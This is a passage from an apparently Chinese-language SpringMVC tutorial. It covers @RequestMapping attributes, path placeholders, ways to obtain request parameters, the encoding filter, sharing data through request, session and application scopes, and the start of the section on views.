title="3.4、@RequestMapping注解的method属性"></a>3.4、@RequestMapping注解的method属性</h2><p>@RequestMapping注解的method属性通过请求的请求方式（get或post）匹配请求映射</p><p>@RequestMapping注解的method属性是一个RequestMethod类型的数组，表示该请求映射能够匹配多种请求方式的请求</p><p>若当前请求的请求地址满足请求映射的value属性，但是请求方式不满足method属性，则浏览器报错</p><p>405：Request method ‘POST’ not supported</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/test&#125;&quot;</span>&gt;</span>测试@RequestMapping的value属性--&gt;/test<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/test&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/testRequestMapping&quot;, &quot;/test&quot;&#125;,</span></span><br><span class="line"><span class="meta">    method = &#123;RequestMethod.GET, RequestMethod.POST&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestMapping</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：</p><p>1、对于处理指定请求方式的控制器方法，SpringMVC中提供了@RequestMapping的派生注解</p><p>处理get请求的映射–&gt;@GetMapping</p><p>处理post请求的映射–&gt;@PostMapping</p><p>处理put请求的映射–&gt;@PutMapping</p><p>处理delete请求的映射–&gt;@DeleteMapping</p><p>2、常用的请求方式有get，post，put，delete</p><p>但是目前浏览器只支持get和post，若在form表单提交时，为method设置了其他请求方式的字符</p><p>串（put或delete），则按照默认的请求方式get处理</p><p>若要发送put和delete请求，则需要通过spring提供的过滤器HiddenHttpMethodFilter，在</p><p>RESTful部分会讲到</p></blockquote><h2 id="3-5、-RequestMapping注解的params属性（了解）"><a href="#3-5、-RequestMapping注解的params属性（了解）" class="headerlink" title="3.5、@RequestMapping注解的params属性（了解）"></a>3.5、@RequestMapping注解的params属性（了解）</h2><p>@RequestMapping注解的params属性通过请求的请求参数匹配请求映射</p><p>@RequestMapping注解的params属性是一个字符串类型的数组，可以通过四种表达式设置请求参数</p><p>和请求映射的匹配关系</p><p>“param”：要求请求映射所匹配的请求必须携带param请求参数</p><p>“!param”：要求请求映射所匹配的请求必须不能携带param请求参数</p><p>“param&#x3D;value”：要求请求映射所匹配的请求必须携带param请求参数且param&#x3D;value</p><p>“param!&#x3D;value”：要求请求映射所匹配的请求必须携带param请求参数但是param!&#x3D;value</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/test(username=&#x27;admin&#x27;,password=123456)&quot;</span>&gt;</span>测试@RequestMapping的</span><br><span class="line">params属性--&gt;/test<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/testRequestMapping&quot;, &quot;/test&quot;&#125;</span></span><br><span class="line"><span class="meta">    ,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;</span></span><br><span class="line"><span class="meta">    ,params = &#123;&quot;username&quot;,&quot;password!=123456&quot;&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestMapping</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：</p><p>若当前请求满足@RequestMapping注解的value和method属性，但是不满足params属性，此时</p><p>页面回报错400：Parameter conditions “username, password!&#x3D;123456” not met for actual</p><p>request parameters: username&#x3D;{admin}, password&#x3D;{123456}</p></blockquote><h2 id="3-6、-RequestMapping注解的headers属性（了解）"><a href="#3-6、-RequestMapping注解的headers属性（了解）" class="headerlink" title="3.6、@RequestMapping注解的headers属性（了解）"></a>3.6、@RequestMapping注解的headers属性（了解）</h2><p>@RequestMapping注解的headers属性通过请求的请求头信息匹配请求映射</p><p>@RequestMapping注解的headers属性是一个字符串类型的数组，可以通过四种表达式设置请求头信</p><p>息和请求映射的匹配关系</p><p>“header”：要求请求映射所匹配的请求必须携带header请求头信息</p><p>“!header”：要求请求映射所匹配的请求必须不能携带header请求头信息</p><p>“header&#x3D;value”：要求请求映射所匹配的请求必须携带header请求头信息且header&#x3D;value</p><p>“header!&#x3D;value”：要求请求映射所匹配的请求必须携带header请求头信息且header!&#x3D;value</p><p>若当前请求满足@RequestMapping注解的value和method属性，但是不满足headers属性，此时页面</p><p>显示404错误，即资源未找到</p><h2 id="3-7、SpringMVC支持ant风格的路径"><a href="#3-7、SpringMVC支持ant风格的路径" class="headerlink" title="3.7、SpringMVC支持ant风格的路径"></a>3.7、SpringMVC支持ant风格的路径</h2><p>？：表示任意的单个字符</p><p>*：表示任意的0个或多个字符</p><p>**：表示任意层数的任意目录</p><p>注意：在使用<strong>时，只能使用&#x2F;</strong>&#x2F;xxx的方式</p><h2 id="3-8、SpringMVC支持路径中的占位符（重点）"><a href="#3-8、SpringMVC支持路径中的占位符（重点）" class="headerlink" title="3.8、SpringMVC支持路径中的占位符（重点）"></a>3.8、SpringMVC支持路径中的占位符（重点）</h2><p>原始方式：&#x2F;deleteUser?id&#x3D;1</p><p>rest方式：&#x2F;user&#x2F;delete&#x2F;1</p><p>SpringMVC路径中的占位符常用于RESTful风格中，当请求路径中将某些数据通过路径的方式传输到服</p><p>务器中，就可以在相应的@RequestMapping注解的value属性中通过占位符{xxx}表示传输的数据，在</p><p>通过@PathVariable注解，将占位符所表示的数据赋值给控制器方法的形参</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/testRest/1/admin&#125;&quot;</span>&gt;</span>测试路径中的占位符--&gt;/testRest<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRest/&#123;id&#125;/&#123;username&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRest</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> String id, <span class="meta">@PathVariable(&quot;username&quot;)</span></span></span><br><span class="line"><span class="params">String username)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;id:&quot;</span>+id+<span class="string">&quot;,username:&quot;</span>+username);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最终输出的内容为--&gt;id:1,username:admin</span></span><br></pre></td></tr></table></figure><h1 id="4、SpringMVC获取请求参数"><a href="#4、SpringMVC获取请求参数" class="headerlink" title="4、SpringMVC获取请求参数"></a>4、SpringMVC获取请求参数</h1><h2 id="4-1、通过ServletAPI获取"><a href="#4-1、通过ServletAPI获取" class="headerlink" title="4.1、通过ServletAPI获取"></a>4.1、通过ServletAPI获取</h2><p>将HttpServletRequest作为控制器方法的形参，此时HttpServletRequest类型的参数表示封装了当前请求的请求报文的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testParam</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;username:&quot;</span>+username+<span class="string">&quot;,password:&quot;</span>+password);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2、通过控制器方法的形参获取请求参数"><a href="#4-2、通过控制器方法的形参获取请求参数" class="headerlink" title="4.2、通过控制器方法的形参获取请求参数"></a>4.2、通过控制器方法的形参获取请求参数</h2><p>在控制器方法的形参位置，设置和请求参数同名的形参，当浏览器发送请求，匹配到请求映射时，在</p><p>DispatcherServlet中就会将请求参数赋值给相应的形参</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/testParam(username=&#x27;admin&#x27;,password=123456)&#125;&quot;</span>&gt;</span>测试获取请求参数--</span><br><span class="line">&gt;/testParam<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testParam</span><span class="params">(String username, String password)</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;username:&quot;</span>+username+<span class="string">&quot;,password:&quot;</span>+password);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：</p><p>若请求所传输的请求参数中有多个同名的请求参数，此时可以在控制器方法的形参中设置字符串</p><p>数组或者字符串类型的形参接收此请求参数</p><p>若使用字符串数组类型的形参，此参数的数组中包含了每一个数据</p><p>若使用字符串类型的形参，此参数的值为每个数据中间使用逗号拼接的结果</p></blockquote><h2 id="4-3、-RequestParam"><a href="#4-3、-RequestParam" class="headerlink" title="4.3、@RequestParam"></a>4.3、@RequestParam</h2><p>@RequestParam是将请求参数和控制器方法的形参创建映射关系</p><p>@RequestParam注解一共有三个属性：</p><p>value：指定为形参赋值的请求参数的参数名</p><p>required：设置是否必须传输此请求参数，默认值为true</p><p>若设置为true时，则当前请求必须传输value所指定的请求参数，若没有传输该请求参数，且没有设置</p><p>defaultValue属性，则页面报错400：Required String parameter ‘xxx’ is not present；若设置为</p><p>false，则当前请求不是必须传输value所指定的请求参数，若没有传输，则注解所标识的形参的值为</p><p>null</p><p>defaultValue：不管required属性值为true或false，当value所指定的请求参数没有传输或传输的值</p><p>为””时，则使用默认值为形参赋值</p><h2 id="4-4、-RequestHeader"><a href="#4-4、-RequestHeader" class="headerlink" title="4.4、@RequestHeader"></a>4.4、@RequestHeader</h2><p>@RequestHeader是将请求头信息和控制器方法的形参创建映射关系</p><p>@RequestHeader注解一共有三个属性：value、required、defaultValue，用法同@RequestParam</p><h2 id="4-5、-CookieValue"><a href="#4-5、-CookieValue" class="headerlink" title="4.5、@CookieValue"></a>4.5、@CookieValue</h2><p>@CookieValue是将cookie数据和控制器方法的形参创建映射关系</p><p>@CookieValue注解一共有三个属性：value、required、defaultValue，用法同@RequestParam</p><h2 id="4-6、通过POJO获取请求参数"><a href="#4-6、通过POJO获取请求参数" class="headerlink" title="4.6、通过POJO获取请求参数"></a>4.6、通过POJO获取请求参数</h2><p>可以在控制器方法的形参位置设置一个实体类类型的形参，此时若浏览器传输的请求参数的参数名和实体类中的属性名一致，那么请求参数就会为此属性赋值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/testpojo&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    性别：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;男&quot;</span>&gt;</span>男<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span><span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span>女<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    年龄：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    邮箱：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testpojo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testPOJO</span><span class="params">(User user)</span>&#123;</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最终结果--&gt;User&#123;id=null, username=&#x27;张三&#x27;, password=&#x27;123&#x27;, age=23, sex=&#x27;男&#x27;,</span></span><br><span class="line">email=<span class="string">&#x27;123@qq.com&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="4-7、解决获取请求参数的乱码问题"><a href="#4-7、解决获取请求参数的乱码问题" class="headerlink" title="4.7、解决获取请求参数的乱码问题"></a>4.7、解决获取请求参数的乱码问题</h2><p>解决获取请求参数的乱码问题，可以使用SpringMVC提供的编码过滤器CharacterEncodingFilter，但是必须在web.xml中进行注册</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置springMVC的编码过滤器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注：</p><p>SpringMVC中处理编码的过滤器一定要配置到其他过滤器之前，否则无效</p></blockquote><h1 id="5、域对象共享数据"><a href="#5、域对象共享数据" class="headerlink" title="5、域对象共享数据"></a>5、域对象共享数据</h1><h2 id="5-1、使用ServletAPI向request域对象共享数据"><a href="#5-1、使用ServletAPI向request域对象共享数据" class="headerlink" title="5.1、使用ServletAPI向request域对象共享数据"></a>5.1、使用ServletAPI向request域对象共享数据</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testServletAPI&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testServletAPI</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;testScope&quot;</span>, <span class="string">&quot;hello,servletAPI&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-2、使用ModelAndView向request域对象共享数据"><a href="#5-2、使用ModelAndView向request域对象共享数据" class="headerlink" title="5.2、使用ModelAndView向request域对象共享数据"></a>5.2、使用ModelAndView向request域对象共享数据</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testModelAndView&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">testModelAndView</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ModelAndView有Model和View的功能</span></span><br><span class="line"><span class="comment">     * Model主要用于向请求域共享数据</span></span><br><span class="line"><span class="comment">     * View主要用于设置视图，实现页面跳转</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">mav</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">    <span class="comment">//向请求域共享数据</span></span><br><span class="line">    mav.addObject(<span class="string">&quot;testScope&quot;</span>, <span class="string">&quot;hello,ModelAndView&quot;</span>);</span><br><span class="line">    <span class="comment">//设置视图，实现页面跳转</span></span><br><span class="line">    mav.setViewName(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-3、使用Model向request域对象共享数据"><a href="#5-3、使用Model向request域对象共享数据" class="headerlink" title="5.3、使用Model向request域对象共享数据"></a>5.3、使用Model向request域对象共享数据</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testModel&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testModel</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;testScope&quot;</span>, <span class="string">&quot;hello,Model&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-4、使用map向request域对象共享数据"><a href="#5-4、使用map向request域对象共享数据" class="headerlink" title="5.4、使用map向request域对象共享数据"></a>5.4、使用map向request域对象共享数据</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testMap&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMap</span><span class="params">(Map&lt;String, Object&gt; map)</span>&#123;</span><br><span class="line">    map.put(<span class="string">&quot;testScope&quot;</span>, <span class="string">&quot;hello,Map&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.5、使用ModelMap向request域对象共享数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testModelMap&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testModelMap</span><span class="params">(ModelMap modelMap)</span>&#123;</span><br><span class="line">    modelMap.addAttribute(<span class="string">&quot;testScope&quot;</span>, <span class="string">&quot;hello,ModelMap&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-6、Model、ModelMap、Map的关系"><a href="#5-6、Model、ModelMap、Map的关系" class="headerlink" title="5.6、Model、ModelMap、Map的关系"></a>5.6、Model、ModelMap、Map的关系</h2><p>Model、ModelMap、Map类型的参数其实本质上都是 BindingAwareModelMap 类型的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Model</span>&#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModelMap</span> <span class="keyword">extends</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt; &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExtendedModelMap</span> <span class="keyword">extends</span> <span class="title class_">ModelMap</span> <span class="keyword">implements</span> <span class="title class_">Model</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BindingAwareModelMap</span> <span class="keyword">extends</span> <span class="title class_">ExtendedModelMap</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="5-7、向session域共享数据"><a href="#5-7、向session域共享数据" class="headerlink" title="5.7、向session域共享数据"></a>5.7、向session域共享数据</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testSession&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testSession</span><span class="params">(HttpSession session)</span>&#123;</span><br><span class="line">    session.setAttribute(<span class="string">&quot;testSessionScope&quot;</span>, <span class="string">&quot;hello,session&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-8、向application域共享数据"><a href="#5-8、向application域共享数据" class="headerlink" title="5.8、向application域共享数据"></a>5.8、向application域共享数据</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testApplication&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testApplication</span><span class="params">(HttpSession session)</span>&#123;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">application</span> <span class="operator">=</span> session.getServletContext();</span><br><span class="line">    application.setAttribute(<span class="string">&quot;testApplicationScope&quot;</span>, <span class="string">&quot;hello,application&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="6、SpringMVC的视图"><a href="#6、SpringMVC的视图" class="headerlink" title="6、SpringMVC的视图"></a>6、SpringMVC的视图</h1><p>SpringMVC中的视图是View接口，视图的作用渲染数据，将模型Model中的数据展示给用户</p><p>SpringMVC视图的种类很多，默认有转发视图和重定向视图</p><p>当工程引入jstl的依赖，转发视图会自动转换为JstlView</p><p>若使用的视图技术为Thymeleaf，在SpringMVC的配置文件中配置了Thymeleaf的视图解析器，由此视图解析器解析之后所得到的是ThymeleafView</p><h2 id="6-1、ThymeleafView"><a href="#6-1、ThymeleafView" class="headerlink" title="6.1、ThymeleafView"></a>6.1、ThymeleafView</h2><p>当控制器方法中所设置的视图名称没有任何前缀时，此时的视图名称会被SpringMVC配置文件中所配置的视图解析器解析，视图名称拼接视图前缀和视图</p><p>后缀所得到的最终路径，会通过转发的方式实现跳转</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testHello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testHello</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/30.png" alt="30"></p><h2 id="6-2、转发视图"><a href="#6-2、转发视图" class="headerlink" title="6.2、转发视图"></a>6.2、转发视图</h2><p>SpringMVC中默认的转发视图是InternalResourceView</p><p>SpringMVC中创建转发视图的情况：</p><p>当控制器方法中所设置的视图名称以”forward:”为前缀时，创建InternalResourceView视图，此时的视图名称不会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀”forward:”去掉，剩余部分作为最终路径通过转发的方式实现跳转</p><p>例如”forward:&#x2F;“，”forward:&#x2F;employee”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testForward&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testForward</span><span 